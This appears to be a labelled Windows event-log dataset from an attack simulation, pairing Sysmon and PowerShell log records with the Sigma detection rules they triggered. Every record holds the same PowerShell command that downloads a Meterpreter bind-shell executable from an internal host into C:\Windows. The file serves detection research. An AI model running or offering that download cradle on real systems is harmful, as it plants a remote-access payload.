{"event": {"@timestamp": "2022-12-19T10:08:06.688Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "7c955a0abc747f57ccc4324480737ef7", "md5": "04029e121a0cfa5991749937dd22a1d9", "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.688\nProcessGuid: {4901c233-3806-63a0-5d07-000000000600}\nProcessId: 3036\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {4901c233-3806-63a0-5c07-000000000600}\nParentProcessId: 6024\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nParentUser: CLIENT1\\ssh", "process": {"args": ["powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5d07-000000000600}", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "hash": {"md5": "04029e121a0cfa5991749937dd22a1d9", "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"}, "name": "powershell.exe", "parent": {"args": ["cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5c07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe", "pid": 6024}, "pe": {"imphash": "7c955a0abc747f57ccc4324480737ef7"}, "pid": 3036, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["04029e121a0cfa5991749937dd22a1d9", "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f", "7c955a0abc747f57ccc4324480737ef7"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows PowerShell", "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "PowerShell.EXE", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4644, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "PowerShell Web Download", "authors": ["Florian Roth"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Scripts or tools that download files"], "id": "6e897651-f157-4d8f-aaeb-df8151488385", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.688+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.688Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "7c955a0abc747f57ccc4324480737ef7", "md5": "04029e121a0cfa5991749937dd22a1d9", "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.688\nProcessGuid: {4901c233-3806-63a0-5d07-000000000600}\nProcessId: 3036\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {4901c233-3806-63a0-5c07-000000000600}\nParentProcessId: 6024\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nParentUser: CLIENT1\\ssh", "process": {"args": ["powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5d07-000000000600}", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "hash": {"md5": "04029e121a0cfa5991749937dd22a1d9", "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"}, "name": "powershell.exe", "parent": {"args": ["cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5c07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe", "pid": 6024}, "pe": {"imphash": "7c955a0abc747f57ccc4324480737ef7"}, "pid": 3036, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["04029e121a0cfa5991749937dd22a1d9", "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f", "7c955a0abc747f57ccc4324480737ef7"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows PowerShell", "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "PowerShell.EXE", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4644, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "Windows Suspicious Use Of Web Request in CommandLine", "authors": ["James Pemberton / @4A616D6573"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."], "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/", "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"], "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.688+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.688Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "7c955a0abc747f57ccc4324480737ef7", "md5": "04029e121a0cfa5991749937dd22a1d9", "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.688\nProcessGuid: {4901c233-3806-63a0-5d07-000000000600}\nProcessId: 3036\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {4901c233-3806-63a0-5c07-000000000600}\nParentProcessId: 6024\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nParentUser: CLIENT1\\ssh", "process": {"args": ["powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5d07-000000000600}", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "hash": {"md5": "04029e121a0cfa5991749937dd22a1d9", "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"}, "name": "powershell.exe", "parent": {"args": ["cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5c07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe", "pid": 6024}, "pe": {"imphash": "7c955a0abc747f57ccc4324480737ef7"}, "pid": 3036, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["04029e121a0cfa5991749937dd22a1d9", "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f", "7c955a0abc747f57ccc4324480737ef7"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows PowerShell", "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "PowerShell.EXE", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4644, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "PowerShell DownloadFile", "authors": ["Florian Roth"], "level": "high", "source": "sigma", "status": "experimental", "falsepositives": ["Unknown"], "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"], "tags": ["attack.execution", "attack.t1059.001", "attack.command_and_control", "attack.t1104", "attack.t1105"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.688+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.430Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Engine Lifecycle", "category": ["process"], "code": 400, "created": "2022-12-19T10:08:08.286Z", "kind": "event", "module": "powershell", "provider": "PowerShell", "sequence": 13, "type": ["start"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Engine state is changed from None to Available. \n\nDetails: \n\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=1a7c9b00-460d-481a-8988-881ce687805a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=89bef4a5-226d-49fb-8654-a6d47723fb0c\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=", "powershell": {"engine": {"new_state": "Available", "previous_state": "None", "version": "5.1.19041.1237"}, "process": {"executable_version": "5.1.19041.1237"}, "runspace_id": "89bef4a5-226d-49fb-8654-a6d47723fb0c"}, "process": {"args": ["powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,", "C:\\Windows\\meterpreter_bind_tcp.exe)"], "args_count": 8, "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")", "entity_id": "1a7c9b00-460d-481a-8988-881ce687805a", "title": "ConsoleHost"}, "winlog": {"api": "wineventlog", "channel": "Windows PowerShell", "computer_name": "CLIENT1.breach.local", "event_id": 400, "keywords": ["Classic"], "opcode": "Info", "provider_name": "PowerShell", "record_id": 6710, "task": "Engine Lifecycle"}}, "rule": {"name": "Alternate PowerShell Hosts", "authors": ["Roberto Rodriguez @Cyb3rWard0g"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Programs using PowerShell directly without invocation of a dedicated interpreter", "MSP Detection Searcher", "Citrix ConfigSync.ps1"], "id": "d7326048-328b-4d5e-98af-86e84b17c765", "logsource": {"category": "ps_classic_start", "definition": "fields have to be extract from event", "product": "windows"}, "references": ["https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html"], "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.430+00:00", "misuse": true, "mitreattack": {"Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.430Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Engine Lifecycle", "category": ["process"], "code": 400, "created": "2022-12-19T10:08:08.286Z", "kind": "event", "module": "powershell", "provider": "PowerShell", "sequence": 13, "type": ["start"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Engine state is changed from None to Available. \n\nDetails: \n\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=1a7c9b00-460d-481a-8988-881ce687805a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=89bef4a5-226d-49fb-8654-a6d47723fb0c\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=", "powershell": {"engine": {"new_state": "Available", "previous_state": "None", "version": "5.1.19041.1237"}, "process": {"executable_version": "5.1.19041.1237"}, "runspace_id": "89bef4a5-226d-49fb-8654-a6d47723fb0c"}, "process": {"args": ["powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,", "C:\\Windows\\meterpreter_bind_tcp.exe)"], "args_count": 8, "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")", "entity_id": "1a7c9b00-460d-481a-8988-881ce687805a", "title": "ConsoleHost"}, "winlog": {"api": "wineventlog", "channel": "Windows PowerShell", "computer_name": "CLIENT1.breach.local", "event_id": 400, "keywords": ["Classic"], "opcode": "Info", "provider_name": "PowerShell", "record_id": 6710, "task": "Engine Lifecycle"}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "3236fcd0-b7e3-4433-b4f8-86ad61a9af2d", "logsource": {"category": "ps_classic_start", "definition": "fields have to be extract from event", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.430+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Windows PowerShell Web Request", "authors": ["James Pemberton / @4A616D6573"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."], "id": "1139d2e2-84b1-4226-b445-354492eba8ba", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "references": ["https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/", "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"], "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
